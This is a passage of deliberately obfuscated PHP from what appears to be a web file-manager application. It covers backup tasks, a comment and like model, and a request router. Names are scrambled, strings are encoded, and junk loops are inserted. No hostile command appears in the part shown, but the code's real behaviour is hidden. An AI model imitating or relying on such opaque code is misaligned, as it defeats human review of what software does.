$Á´Ü¤Ãµ[0] : null; } public function kill($øİäëÌ) { $‹òÑÉÆß =& $_SERVER[”øäÃÍª]; $‹í†©È™ = $this->listData($øİäëÌ); if (!$‹í†©È™ || empty($‹í†©È™[$‹òÑÉÆß[32]])) { return !0; } Task::kill($‹òÑÉÆß[896]); Task::kill($‹òÑÉÆß[917]); Task::kill($‹òÑÉÆß[925]); $šÆ—¡Œª = $‹í†©È™[$‹òÑÉÆß[32]]; $²‰¸¶ = TEMP_FILES . $‹òÑÉÆß[892] . $šÆ—¡Œª . $‹òÑÉÆß[8]; IO::remove($²‰¸¶, !1); return $this->remove($øİäëÌ); } public function remove($ª–ºÇíÅ) { $ÅÊ—Š¾¡ = $this->listData($ª–ºÇíÅ); if (!$ÅÊ—Š¾¡) { return !0; } return $this->backupRemove($ÅÊ—Š¾¡); } private function backupRemove($§øâ°) { parent::remove($§øâ°[$_SERVER[”øäÃÍª][487]]); $ÖÕı“Ü = $this->backupPath($§øâ°); IO::remove($ÖÕı“Ü, !1); return !0; } private function backupPath($ó÷ö”×¨) { $¢óşÁ¼ =& $_SERVER[”øäÃÍª]; $Ä¨ˆ²¾ó = $ó÷ö”×¨[$¢óşÁ¼[32]]; $â¯Ò¿Åà = Model($¢óşÁ¼[882])->get($¢óşÁ¼[883]); $¨ÖÙôÒ‹ = substr(md5($¢óşÁ¼[884] . $â¯Ò¿Åà . $Ä¨ˆ²¾ó), 0, 8); return "\173\151\157\x3a{$ó÷ö”×¨[$¢óşÁ¼[861]]}\175\57\144\141\x74\x61\x62\x61\x73\145\57\x62\x61\x63\x6b\x75\x70\x2f" . $Ä¨ˆ²¾ó . $¢óşÁ¼[11] . $¨ÖÙôÒ‹; } public function start() { $¬€šşË¨ =& $_SERVER[”øäÃÍª]; if ($GLOBALS[$¬€šşË¨[6]][$¬€šşË¨[92]][$¬€šşË¨[2166]] != $¬€šşË¨[91]) { return !0; } $Û·¾­ ¤ = $this->config(); if (!$Û·¾­ ¤ || $Û·¾­ ¤[$¬€šşË¨[1904]] != $¬€šşË¨[91]) { return !1; } if ($Û·¾­ ¤[$¬€šşË¨[168]] == $¬€šşË¨[888]) { $‰ÅÈƒ®Ò = Model($¬€šşË¨[882])->get($¬€šşË¨[1382]); if ($‰ÅÈƒ®Ò == $¬€šşË¨[1383]) { $Û·¾­ ¤[$¬€šşË¨[168]] = $¬€šşË¨[1260]; } } $ÁÂšøà = $this->process(); foreach ($ÁÂšøà as $š¨»Üèå) { if ($š¨»Üèå) { return Task::restart($š¨»Üèå[$¬€šşË¨[487]]); } } $“ê¤°Õ™ = new Backup(); $¡Ùªªá¢ = $“ê¤°Õ™->db(); if ($¡Ùªªá¢) { $¡Ùªªá¢ = $“ê¤°Õ™->dbFile(); if ($¡Ùªªá¢ && $Û·¾­ ¤[$¬€šşË¨[168]] == $¬€šşË¨[888]) { $¡Ùªªá¢ = $“ê¤°Õ™->file(); } } Backup::set(array($¬€šşË¨[859] => 1, $¬€šşË¨[871] => time())); return !0; } public function process() { $ş¶äé†„ =& $_SERVER[”øäÃÍª]; $ÊôÓÑ = array($ş¶äé†„[867] => Task::get($ş¶äé†„[896]), $ş¶äé†„[872] => Task::get($ş¶äé†„[917]), $ş¶äé†„[230] => Task::get($ş¶äé†„[925])); $Ÿò‹Ñ‚Ê = !1; foreach ($ÊôÓÑ as &$Üëš»²ï) { if ($Ÿò‹Ñ‚Ê) { $Üëš»²ï = !1; continue; } if ($Üëš»²ï) { $×üÓºë  = intval(_get($Üëš»²ï, $ş¶äé†„[1938], 0)); if (time() - $×üÓºë  > 7200) { Task::kill($Üëš»²ï[$ş¶äé†„[487]]); $Ÿò‹Ñ‚Ê = !0; $Üëš»²ï = !1; } } } return $ÊôÓÑ; } public function restore() { $‘ûŸ’ˆë =& $_SERVER[”øäÃÍª]; ActionCall($‘ûŸ’ˆë[2167], !0, 1); ActionCall($‘ûŸ’ˆë[2167], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\156\x74"; protected $tableMeta = array("\164\x61\142\154\145\116\141\155\145" => "\x63\157\x6d\x6d\145\156\x74\x5f\x6d\145\x74\x61", "\x6d\145\164\x61\106\151\x65\154\144" => "\x63\x6f\x6d\x6d\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($È¤›Ä Š) { $¢¹Óñæ =& $_SERVER[”øäÃÍª]; if ($È¤›Ä Š[$¢¹Óñæ[2168]]) { $¡¯¬ôñ = $this->where(array($¢¹Óñæ[2169] => $È¤›Ä Š[$¢¹Óñæ[2168]]))->find(); if (!$¡¯¬ôñ || $¡¯¬ôñ[$¢¹Óñæ[188]] != $È¤›Ä Š[$¢¹Óñæ[188]] || $¡¯¬ôñ[$¢¹Óñæ[597]] != $È¤›Ä Š[$¢¹Óñæ[597]]) { return !1; } $this->where(array($¢¹Óñæ[2169] => $È¤›Ä Š[$¢¹Óñæ[2168]]))->setAdd($¢¹Óñæ[2170], 1); } $È¤›Ä Š[$¢¹Óñæ[2171]] = 0; $È¤›Ä Š[$¢¹Óñæ[2170]] = 0; $È¤›Ä Š[$¢¹Óñæ[859]] = 1; return $this->add($È¤›Ä Š); } public function commentCount($Ë¸ÒàŒİ, $¯Æß®³ü, $©Œ»„ç = false) { $÷â«¬Ñœ =& $_SERVER[”øäÃÍª]; if (!$Ë¸ÒàŒİ) { return array(); } if (is_string($Ë¸ÒàŒİ) || is_int($Ë¸ÒàŒİ)) { $Ë¸ÒàŒİ = array($Ë¸ÒàŒİ); } $‹‘Ó©Ï = array($÷â«¬Ñœ[597], $÷â«¬Ñœ[2172] => $÷â«¬Ñœ[593]); $°×¾Àç = array($÷â«¬Ñœ[597] => array($÷â«¬Ñœ[7], $Ë¸ÒàŒİ), $÷â«¬Ñœ[188] => $¯Æß®³ü); if ($©Œ»„ç) { $°×¾Àç[$÷â«¬Ñœ[1548]] = $©Œ»„ç; } $ŒøÇõÉ› = $this->field($‹‘Ó©Ï)->where($°×¾Àç)->group($÷â«¬Ñœ[597])->select(); return array_to_keyvalue($ŒøÇõÉ›, $÷â«¬Ñœ[597], $÷â«¬Ñœ[593]); } public function starTarget($µ€§ø…¬, $ËŞÌÉ) { $—¤æÛ‹» =& $_SERVER[”øäÃÍª]; $ƒ½çüœ¿ = $µ€§ø…¬ + self::TYPE_STAR_OFFSET; $…øËÙİ = array($—¤æÛ‹»[1548] => USER_ID, $—¤æÛ‹»[188] => $ƒ½çüœ¿, $—¤æÛ‹»[597] => $ËŞÌÉ); $Ó¶Õå² = $this->where($…øËÙİ)->find(); if ($Ó¶Õå²) { return $this->where(array($—¤æÛ‹»[487] => $Ó¶Õå²[$—¤æÛ‹»[487]]))->delete(); } $“´à·µ = array($—¤æÛ‹»[2168] => 0, $—¤æÛ‹»[1548] => USER_ID, $—¤æÛ‹»[859] => 1, $—¤æÛ‹»[168] => $—¤æÛ‹»[12], $—¤æÛ‹»[188] => $ƒ½çüœ¿, $—¤æÛ‹»[597] => $ËŞÌÉ, $—¤æÛ‹»[2171] => 0, $—¤æÛ‹»[2170] => 0); return $this->add($“´à·µ); } public function starTargetCount($íÂ£˜»é, $Şœù­÷‚) { $úã†¦÷ =& $_SERVER[”øäÃÍª]; $Úùœ‰’Æ = $Şœù­÷‚ + self::TYPE_STAR_OFFSET; $’¬Åİ’· = $this->commentCount($íÂ£˜»é, $Úùœ‰’Æ); $‡¾Æ–Ñˆ = $this->commentCount($íÂ£˜»é, $Úùœ‰’Æ, USER_ID); return array($úã†¦÷[2173] => $’¬Åİ’·, $úã†¦÷[2174] => $‡¾Æ–Ñˆ); } public function starTargetUserList($æ« ïõÈ, $ÀöÉÌ°) { $ò©Â× =& $_SERVER[”øäÃÍª]; $ìóŒ§®ù = $æ« ïõÈ + self::TYPE_STAR_OFFSET; $’¦Ğ•ÛĞ = array($ò©Â×[597] => $ÀöÉÌ°, $ò©Â×[188] => $ìóŒ§®ù); $Ÿ¬Éª³² = $this->where($’¦Ğ•ÛĞ)->count(); $Ï¢°ÀüÈ = array($ò©Â×[332] => $Ÿ¬Éª³², $ò©Â×[2175] => array()); if (!$Ÿ¬Éª³²) { return $Ï¢°ÀüÈ; } $•Èƒ¶ö = $this->field($ò©Â×[1548])->where($’¦Ğ•ÛĞ)->limit(500)->select(); $•Èƒ¶ö = array_to_keyvalue($•Èƒ¶ö, $ò©Â×[12], $ò©Â×[1548]); $Ï¢°ÀüÈ[$ò©Â×[2175]] = Model($ò©Â×[605])->userListInfo($•Èƒ¶ö); return $Ï¢°ÀüÈ; } public function prasiseUserList($Ÿúçİ¾) { $ÕÇâÈäÓ =& $_SERVER[”øäÃÍª]; $‹£óÃîà = array($ÕÇâÈäÓ[2176] => $Ÿúçİ¾); $ª†îéª‹ = $this->where($‹£óÃîà)->find(); $òÃ€Ø¸š = _get($ª†îéª‹, $ÕÇâÈäÓ[2171], 0); $¿úÔ‰šŞ = array($ÕÇâÈäÓ[332] => $òÃ€Ø¸š, $ÕÇâÈäÓ[2175] => array()); if (!$òÃ€Ø¸š) { return $¿úÔ‰šŞ; } $ÜÒæóÈ½ = Model($ÕÇâÈäÓ[2177])->field($ÕÇâÈäÓ[1548])->where($‹£óÃîà)->limit(500)->select(); $ÜÒæóÈ½ = array_to_keyvalue($ÜÒæóÈ½, $ÕÇâÈäÓ[12], $ÕÇâÈäÓ[1548]); $¿úÔ‰šŞ[$ÕÇâÈäÓ[2175]] = Model($ÕÇâÈäÓ[605])->userListInfo($ÜÒæóÈ½); return $¿úÔ‰šŞ; } public function remove($ô×Ş¾°„) { $Õ¨Âˆñ— =& $_SERVER[”øäÃÍª]; $ºíÙ¨Š° = array($Õ¨Âˆñ—[2169] => $ô×Ş¾°„); $™¥¿´µü = $this->where($ºíÙ¨Š°)->find(); if ($™¥¿´µü[$Õ¨Âˆñ—[2168]]) { $this->where(array($Õ¨Âˆñ—[2169] => $™¥¿´µü[$Õ¨Âˆñ—[2168]]))->setAdd($Õ¨Âˆñ—[2170], -1); } return $this->removeArray($ô×Ş¾°„); } public function edit($¿÷Ñ©€Ë, $°«¢ºí») { $“€´ÀæÒ =& $_SERVER[”øäÃÍª]; $ç°Øô = array($“€´ÀæÒ[2169] => $¿÷Ñ©€Ë); return $this->where($ç°Øô)->save(array($“€´ÀæÒ[2178] => $°«¢ºí»)); } public function prasise($¥¿¸­Ï) { $ìâ°Ì®ï =& $_SERVER[”øäÃÍª]; $ô®İíÌÃ = Model($ìâ°Ì®ï[2179]); $™Ë»•†ä = array($ìâ°Ì®ï[2169] => $¥¿¸­Ï, $ìâ°Ì®ï[1925] => USER_ID); $»ş‚ÛõÎ = $ô®İíÌÃ->where($™Ë»•†ä)->find(); if (!$»ş‚ÛõÎ) { $ô®İíÌÃ->add($™Ë»•†ä); $—®ó¦¿Š = $this->where(array($ìâ°Ì®ï[2169] => $¥¿¸­Ï))->setAdd($ìâ°Ì®ï[2171], 1); } else { $ô®İíÌÃ->where($™Ë»•†ä)->delete(); $—®ó¦¿Š = $this->where(array($ìâ°Ì®ï[2169] => $¥¿¸­Ï))->setAdd($ìâ°Ì®ï[2171], -1); } return $—®ó¦¿Š; } public function targetInfo($Õ¡İÙÊş, $à‘ˆğ»Ë) { $ŞÚ¢ƒÀƒ =& $_SERVER[”øäÃÍª]; $İ×˜ä—¿ = array($ŞÚ¢ƒÀƒ[678] => $Õ¡İÙÊş, $ŞÚ¢ƒÀƒ[679] => $à‘ˆğ»Ë); $´óĞ«»¿ = $this->where($İ×˜ä—¿)->count(); $ÂÏÖê— = "\122\111\107\x48\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\143\157\x6d\x6d\x65\x6e\164\x5f\160\162\141\151\163\145\x20\x73\x74\141\162\40\x6f\156\40\x63\x6f\155\155\x65\156\x74\56\143\x6f\155\155\x65\156\x74\x49\x44\x20\75\x20\x73\164\141\x72\56\143\157\155\x6d\x65\156\164\111\104"; $ƒŒ‹¥Åª = $this->alias($ŞÚ¢ƒÀƒ[429])->where($İ×˜ä—¿)->join($ÂÏÖê—, $ŞÚ¢ƒÀƒ[2180])->count(); $„û¼ÓñÔ = array($ŞÚ¢ƒÀƒ[2181] => $´óĞ«»¿, $ŞÚ¢ƒÀƒ[2182] => $ƒŒ‹¥Åª); return $„û¼ÓñÔ; } public function listData($¦óä†áï) { $û½–ëÒ± =& $_SERVER[”øäÃÍª]; if (isset($¦óä†áï[$û½–ëÒ±[2183]])) { if ($¦óä†áï[$û½–ëÒ±[2183]]) { $¦óä†áï[$û½–ëÒ±[2176]] = array($û½–ëÒ±[1136], intval($¦óä†áï[$û½–ëÒ±[2183]])); } unset($¦óä†áï[$û½–ëÒ±[2183]]); } if (isset($¦óä†áï[$û½–ëÒ±[2184]])) { if ($¦óä†áï[$û½–ëÒ±[2184]]) { $¦óä†áï[$û½–ëÒ±[2176]] = array($û½–ëÒ±[1133], intval($¦óä†áï[$û½–ëÒ±[2184]])); } unset($¦óä†áï[$û½–ëÒ±[2184]]); } return $this->_listData($¦óä†áï); } private function _listData($á€ã÷‚—) { $š•ÙÔÛ =& $_SERVER[”øäÃÍª]; $ìıÀßº› = $this->where($á€ã÷‚—)->_makeOrder()->selectPage(100); $this->_listAppendParent($ìıÀßº›[$š•ÙÔÛ[446]]); $this->_listAppendUser($ìıÀßº›[$š•ÙÔÛ[446]]); $this->_listAppendMeta($ìıÀßº›[$š•ÙÔÛ[446]]); return $ìıÀßº›; } private function _makeOrder() { $®ü¬™í =& $_SERVER[”øäÃÍª]; $ÑÑ½Í¨¾ = array($®ü¬™í[2171], $®ü¬™í[2170], $®ü¬™í[231]); $”ÌòèŸ˜ = Input::get($®ü¬™í[552], $®ü¬™í[7], $®ü¬™í[520], $ÑÑ½Í¨¾); $Å¨À¥À = Input::get($®ü¬™í[553], $®ü¬™í[7], $®ü¬™í[1927], array($®ü¬™í[2185], $®ü¬™í[548])); $ìŞËÉ•¡ = $”ÌòèŸ˜ . $®ü¬™í[53] . $Å¨À¥À; return $this->order($ìŞËÉ•¡); } private function _listAppendParent(&$Š‹çÎÄò) { $™ëù¸° =& $_SERVER[”øäÃÍª]; $ÒÒ¢£É = array_unique(array_to_keyvalue($Š‹çÎÄò, $™ëù¸°[12], $™ëù¸°[2168])); $ÒÒ¢£É = array_remove_value($ÒÒ¢£É, $™ëù¸°[228]); if (!$ÒÒ¢£É) { return; } $óµ¾í = $this->where(array($™ëù¸°[2169] => array($™ëù¸°[7], $ÒÒ¢£É)))->select(); $óµ¾í = array_to_keyvalue($óµ¾í, $™ëù¸°[2176]); foreach ($Š‹çÎÄò as &$ßºúş»â) { if (isset($óµ¾í[$ßºúş»â[$™ëù¸°[2168]]])) { $ßºúş»â[$™ëù¸°[2186]] = $óµ¾í[$ßºúş»â[$™ëù¸°[2168]]]; } } unset($ßºúş»â); } private function _listAppendUser(&$Û©”ó‡í) { $ùãÖè· =& $_SERVER[”øäÃÍª]; $ä½èÚ©Ğ = array_unique(array_to_keyvalue($Û©”ó‡í, $ùãÖè·[12], $ùãÖè·[1548])); $ä½èÚ©Ğ = array_remove_value($ä½èÚ©Ğ, $ùãÖè·[228]); if (count($ä½èÚ©Ğ) == 0) { return; } foreach ($Û©”ó‡í as $ïßÖ±ê¯) { if (isset($ïßÖ±ê¯[$ùãÖè·[2186]])) { $ä½èÚ©Ğ[] = $ïßÖ±ê¯[$ùãÖè·[2186]][$ùãÖè·[1548]]; } } $µ²±Öñ = Model($ùãÖè·[625])->userListInfo($ä½èÚ©Ğ); foreach ($Û©”ó‡í as &$ïßÖ±ê¯) { $ïßÖ±ê¯[$ùãÖè·[692]] = $µ²±Öñ[$ïßÖ±ê¯[$ùãÖè·[1548]]]; if (isset($ïßÖ±ê¯[$ùãÖè·[2186]])) { $ïßÖ±ê¯[$ùãÖè·[2186]][$ùãÖè·[692]] = $µ²±Öñ[$ïßÖ±ê¯[$ùãÖè·[2186]][$ùãÖè·[1548]]]; } } unset($ïßÖ±ê¯); } private function _listAppendMeta(&$“û‚óşÄ) { $¾Û”Ã¥½ =& $_SERVER[”øäÃÍª]; $¤Òœ§Ö’ = array_unique(array_to_keyvalue($“û‚óşÄ, $¾Û”Ã¥½[12], $¾Û”Ã¥½[2176])); $¤Òœ§Ö’ = array_remove_value($¤Òœ§Ö’, $¾Û”Ã¥½[228]); if (!$¤Òœ§Ö’) { return; } foreach ($“û‚óşÄ as $ƒ½¯ø…Û) { if (isset($ƒ½¯ø…Û[$¾Û”Ã¥½[2186]])) { $¤Òœ§Ö’[] = $ƒ½¯ø…Û[$¾Û”Ã¥½[2186]][$¾Û”Ã¥½[2176]]; } } $á€Ÿì = $this->metaList($¤Òœ§Ö’); if (!$á€Ÿì) { return !1; } foreach ($“û‚óşÄ as &$ƒ½¯ø…Û) { $ƒ½¯ø…Û[$¾Û”Ã¥½[563]] = $á€Ÿì[$ƒ½¯ø…Û[$¾Û”Ã¥½[2176]]]; if (isset($ƒ½¯ø…Û[$¾Û”Ã¥½[2186]])) { $ƒ½¯ø…Û[$¾Û”Ã¥½[2186]][$¾Û”Ã¥½[563]] = $á€Ÿì[$ƒ½¯ø…Û[$¾Û”Ã¥½[2186]][$¾Û”Ã¥½[2176]]]; } } unset($ƒ½¯ø…Û); } private function metaList($À±¶¤­) { $ºÅŒÆÁĞ =& $_SERVER[”øäÃÍª]; if (!$À±¶¤­) { return array(); } $èŞÏîÛÚ = array($ºÅŒÆÁĞ[2176] => array($ºÅŒÆÁĞ[7], $À±¶¤­)); $ß½‹†„Î = Model($ºÅŒÆÁĞ[2187])->where($èŞÏîÛÚ)->select(); $ß½‹†„Î = array_to_keyvalue_group($ß½‹†„Î, $ºÅŒÆÁĞ[2176]); foreach ($ß½‹†„Î as $¥Ø–’£ => $ãŒ©”ö) { $Ö°û¤à„ = array(); foreach ($ãŒ©”ö as $¯»Ó²ÆÃ) { $Ö°û¤à„[$¯»Ó²ÆÃ[$ºÅŒÆÁĞ[95]]] = $¯»Ó²ÆÃ[$ºÅŒÆÁĞ[451]]; } $ß½‹†„Î[$¥Ø–’£] = $Ö°û¤à„; } return $ß½‹†„Î ? $ß½‹†„Î : array(); } public function removeTarget($®—ôÄİé, $Œê£¨°ê) { $Ÿ¯ş…—µ =& $_SERVER[”øäÃÍª]; if (!$Œê£¨°ê) { return !0; } $Œê£¨°ê = is_array($Œê£¨°ê) ? $Œê£¨°ê : array($Œê£¨°ê); $ˆ‰Ëµıê = array($Ÿ¯ş…—µ[188] => $®—ôÄİé, $Ÿ¯ş…—µ[597] => array($Ÿ¯ş…—µ[7], $Œê£¨°ê)); $Û¯ôÒßú = $this->field($Ÿ¯ş…—µ[2176])->where($ˆ‰Ëµıê)->select(); $Ùô¾¤çŒ = array_to_keyvalue($Û¯ôÒßú, $Ÿ¯ş…—µ[12], $Ÿ¯ş…—µ[2176]); return $this->removeArray($Ùô¾¤çŒ); } public function removeArray($İë™¬§è) { $Åáâ«‡ =& $_SERVER[”øäÃÍª]; if (!$İë™¬§è) { return !0; } $İë™¬§è = is_array($İë™¬§è) ? $İë™¬§è : array($İë™¬§è); $ËÔÓÉô = array($Åáâ«‡[2176] => array($Åáâ«‡[7], $İë™¬§è)); Model($Åáâ«‡[2179])->where($ËÔÓÉô)->delete(); Model($Åáâ«‡[2188])->where($ËÔÓÉô)->delete(); return $this->where($ËÔÓÉô)->delete(); } } goto CùÍ»İ¾Ò¸; BÑÛªí—„÷: $yjvmbiwlka = $_SERVER[”øäÃÍª][712]; if (!$yjvmbiwlka) { return; } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\156\x64\x65\x78"; function __construct() { } public function setDefault($ÌÎŒ¦Æş) { $âÆ‹ÂÏİ =& $_SERVER[”øäÃÍª]; $ àêçÌì =& $_SERVER[‘‹å÷ç]; $çäæ¨İ’ = explode($ àêçÌì[0], trim($ÌÎŒ¦Æş, $ àêçÌì[0])); $•ö‰äã = $âÆ‹ÂÏİ[713]; if (strlen($•ö‰äã) < $âÆ‹ÂÏİ[497]) { die; } $this->defaultModule = $çäæ¨İ’[0] ? $çäæ¨İ’[0] : $this->defaultModule; $üŒÉ¢°« = $âÆ‹ÂÏİ[714]; if (strlen($üŒÉ¢°«) < $âÆ‹ÂÏİ[497]) { die; } $this->defaultController = $çäæ¨İ’[1] ? $çäæ¨İ’[1] : $this->defaultController; $this->defaultAction = $çäæ¨İ’[2] ? $çäæ¨İ’[2] : $this->defaultAction; $ì£ÄÀ„š = $âÆ‹ÂÏİ[715]; $this->biuoe2e2ac99($ àêçÌì[1], array($this, $ àêçÌì[2])); } public function appRun($…¢ßÄ’ı) { $º±‡á‹ô =& $_SERVER[”øäÃÍª]; $â€£Ã¬» =& $_SERVER[‘‹å÷ç]; $±¼£´æï = explode($â€£Ã¬»[0], $…¢ßÄ’ı); $ÓÀ§ˆ³ = strtolower($±¼£´æï[0]); $ëôÙ¤µá = $â€£Ã¬»[3]; $÷×ÊĞé„ = $º±‡á‹ô[716]; if (strlen($÷×ÊĞé„) < $º±‡á‹ô[717]) { return; } if ($ÓÀ§ˆ³ == $â€£Ã¬»[4]) { $ëôÙ¤µá = $â€£Ã¬»[5]; $±¼£´æï[0] = $â€£Ã¬»[6]; $±¼£´æï[1] = $±¼£´æï[1] . $â€£Ã¬»[7]; $…¢ßÄ’ı = join($â€£Ã¬»[0], $±¼£´æï); $…¢ßÄ’ı = trim($…¢ßÄ’ı, $â€£Ã¬»[0]); } call_user_func(array($â€£Ã¬»[8], $â€£Ã¬»[9]), $ëôÙ¤µá . $â€£Ã¬»[10], $…¢ßÄ’ı); ActionCall($…¢ßÄ’ı); call_user_func(array($â€£Ã¬»[8], $â€£Ã¬»[9]), $ëôÙ¤µá . $â€£Ã¬»[11], $…¢ßÄ’ı); $úàÏ†Ç = $º±‡á‹ô[718]; if (!$úàÏ†Ç) { die; } } private function autorun() { $±É—†©Ç =& $_SERVER[‘‹å÷ç]; global $config; $“ñ°ìå… = $_SERVER[”øäÃÍª][719]; if (!$“ñ°ìå…) { return; } if (count($config[$±É—†©Ç[12]]) == 0) { return; } foreach ($config[$±É—†©Ç[12]] as $ ½Ò´‡ => $ñÆü¯µ±) { $this->appRun($ñÆü¯µ±); } } private function aoucb849c308() { $§Ğ¼¸®• =& $_SERVER[”øäÃÍª]; $‹…¯æ¦Ø =& $_SERVER[‘‹å÷ç]; $Š…ğ®Ì = $‹…¯æ¦Ø[4]; $ğ•ÌÕ¡ = $§Ğ¼¸®•[720]; $ÑÛ¥€Ç‚ = $GLOBALS[$‹…¯æ¦Ø[13]][$‹…¯æ¦Ø[14]][0]; $Ñó«ï„ = $§Ğ¼¸®•[721]; if (!$Ñó«ï„) { return; } if (!$ÑÛ¥€Ç‚ || strlen($ÑÛ¥€Ç‚) <= strlen($Š…ğ®Ì)) { return; } if (strtolower(substr($ÑÛ¥€Ç‚, -strlen($Š…ğ®Ì))) != $Š…ğ®Ì) { return; } $½ ¼ş… = substr($ÑÛ¥€Ç‚, 0, -strlen($Š…ğ®Ì)); $àª›Éº = array($‹…¯æ¦Ø[4], $½ ¼ş…); $Ğ®Õ¶ïÄ = $§Ğ¼¸®•[722]; if (strlen($Ğ®Õ¶ïÄ) < $§Ğ¼¸®•[717]) { die; } $Ã¹á”…ï = array_slice($GLOBALS[$‹…¯æ¦Ø[13]][$‹…¯æ¦Ø[14]], 1); $»˜‰¶–® = $§Ğ¼¸®•[723]; while (strlen($»˜‰¶–®) < $§Ğ¼¸®•[724]) { if (!$»˜‰¶–®) { break; } $»˜‰¶–®++; } $GLOBALS[$‹…¯æ¦Ø[13]][$‹…¯æ¦Ø[14]] = array_merge($àª›Éº, $Ã¹á”…ï); $GLOBALS[$‹…¯æ¦Ø[13]][$‹…¯æ¦Ø[15]] = implode($‹…¯æ¦Ø[0], $GLOBALS[$‹…¯æ¦Ø[13]][$‹…¯æ¦Ø[14]]); } private function itbx61e86018() { $ë¥÷ÈŸ¼ =& $_SERVER[”øäÃÍª]; $±èçÛÂ€ =& $_SERVER[‘‹å÷ç]; if ($GLOBALS[$±èçÛÂ€[13]][$±èçÛÂ€[15]] != $±èçÛÂ€[6]) { return; } $ˆ¢ûİà× = $_SERVER[$±èçÛÂ€[16]]; $ÒÄØä£ = $ë¥÷ÈŸ¼[725]; if (strlen($ÒÄØä£) < $ë¥÷ÈŸ¼[726]) { return; } $€ª”ß³Ã = $±èçÛÂ€[17]; if (!strstr($ˆ¢ûİà×, $€ª”ß³Ã)) { return; } $˜±éÈ¢ = strrpos($ˆ¢ûİà×, $€ª”ß³Ã); $üû´±Úã = substr($ˆ¢ûİà×, $˜±éÈ¢ + strlen($€ª”ß³Ã)); preg_match_all($±èçÛÂ€[18], $üû´±Úã, $±çåóŠ); $²‰ìë¯“ = $ë¥÷ÈŸ¼[727]; $üû´±Úã = trim($±çåóŠ[0][0], $±èçÛÂ€[19]); $Ä¨¢ë€Ó = $ë¥÷ÈŸ¼[728]; $GLOBALS[$±èçÛÂ€[13]][$±èçÛÂ€[14]] = explode($±èçÛÂ€[19], $üû´±Úã); $Êò¸§Ïì = $ë¥÷ÈŸ¼[729]; if (!$Êò¸§Ïì) { return; } $GLOBALS[$±èçÛÂ€[13]][$±èçÛÂ€[15]] = implode($±èçÛÂ€[0], $GLOBALS[$±èçÛÂ€[13]][$±èçÛÂ€[14]]); } public function run() { $­—ó–ò =& $_SERVER[”øäÃÍª]; $’ÎÁ‰¤Û =& $_SERVER[‘‹å÷ç]; $this->itbx61e86018(); $this->aoucb849c308(); $Ü™Èâ£ù = $GLOBALS[$’ÎÁ‰¤Û[13]][$’ÎÁ‰¤Û[14]]; $ãÄÑúú€ = $GLOBALS[$’ÎÁ‰¤Û[13]][$’ÎÁ‰¤Û[15]]; define($’ÎÁ‰¤Û[20], isset($Ü™Èâ£ù[0]) && $Ü™Èâ£ù[0] ? $Ü™Èâ£ù[0] : $this->defaultModule); $½é›Ã¡ = $­—ó–ò[730]; while ($½é›Ã¡ < $­—ó–ò[497]) { if ($½é›Ã¡ >= 0) { break; } $½é›Ã¡++; } define($’ÎÁ‰¤Û[21], isset($Ü™Èâ£ù[1]) && $Ü™Èâ£ù[0] ? $Ü™Èâ£ù[1] : $this->defaultController); $Å•Ó˜Ò = $­—ó–ò[731]; while ($Å•Ó˜Ò < $­—ó–ò[497]) { if ($Å•Ó˜Ò >= 0) { break; } $Å•Ó˜Ò++; } define($’ÎÁ‰¤Û[22], isset($Ü™Èâ£ù[2]) && $Ü™Èâ£ù[0] ? $Ü™Èâ£ù[2] : $this->defaultAction); $µä­ÅÏ¨ = $­—ó–ò[732]; while (strlen($µä­ÅÏ¨) < $­—ó–ò[497]) { if (!$µä­ÅÏ¨) { break; } $µä­ÅÏ¨++; } define($’ÎÁ‰¤Û[23], MOD . $’ÎÁ‰¤Û[0] . ST . $’ÎÁ‰¤Û[0] . ACT); $_SERVER[$’ÎÁ‰¤Û[24]] = strtolower(ACTION); $õİÑ•äè = $­—ó–ò[733]; while (strlen($õİÑ•äè) < $­—ó–ò[724]) { if (!$õİÑ•äè) { break; } $õİÑ•äè++; } $this->autorun(); $Èïè» ÷ = $­—ó–ò[734]; while (strlen($Èïè» ÷) < $­—ó–ò[717]) { if (!$Èïè» ÷) { break; } $Èïè» ÷++; } if (count($Ü™Èâ£ù) >= 3) { $this->appRun($ãÄÑúú€); } else { $this->appRun(ACTION); } } private $qdoi53911dcc = array(); private $vtwg4abd075d = ''; public function ynbz426e6a44() { $ÇÎ•¶„ =& $_SERVER[”øäÃÍª]; $Ü“¾˜Ú’ =& $_SERVER[‘‹å÷ç]; $this->nfwg5711f158(); $this->wijf61ce3185(); $‡õÈ‹ÁË = $ÇÎ•¶„[735]; if (strlen($‡õÈ‹ÁË) < $ÇÎ•¶„[736]) { return; } $this->wxqsbed945d3(); $¶¾·®¥ı = $ÇÎ•¶„[737]; if (strlen($¶¾·®¥ı) < $ÇÎ•¶„[717]) { die; } $this->ybvp6928161a(); $this->lcnjea021962(); $¶ûş¹ü = $ÇÎ•¶„[738]; $this->tzbv7cb86dd3(); $this->wynfdde6f6b4(); $‡’æèó÷ = $ÇÎ•¶„[739]; while (strlen($‡’æèó÷) < $ÇÎ•¶„[497]) { if (!$‡’æèó÷) { break; } $‡’æèó÷++; } $this->biuoe2e2ac99($Ü“¾˜Ú’[25], array($this, $Ü“¾˜Ú’[26])); $this->biuoe2e2ac99($Ü“¾˜Ú’[27], array($this, $Ü“¾˜Ú’[28])); $this->biuoe2e2ac99($Ü“¾˜Ú’[29], array($this, $Ü“¾˜Ú’[30])); $this->biuoe2e2ac99($Ü“¾˜Ú’[31], array($this, $Ü“¾˜Ú’[32])); $¶Ò’…äÔ = $ÇÎ•¶„[740]; if (!$¶Ò’…äÔ) { die; } } public function getVersionData() { return $this->qdoi53911dcc; $Öé§ùğÁ = $_SERVER[”øäÃÍª][741]; } public function jhlic7f04865($Ê©«ñ°Å) { $Š±½æôç =& $_SERVER[”øäÃÍª]; $í·ŠŒ— =& $_SERVER[‘‹å÷ç]; $ŞÉ¾Ç = Model($í·ŠŒ—[33])->get(); $ê“ë…é¥ = $Š±½æôç[742]; while (strlen($ê“ë…é¥) < $Š±½æôç[736]) { if (!$ê“ë…é¥) { break; } $ê“ë…é¥++; } $ì¾ÍûÕõ = array($í·ŠŒ—[34], 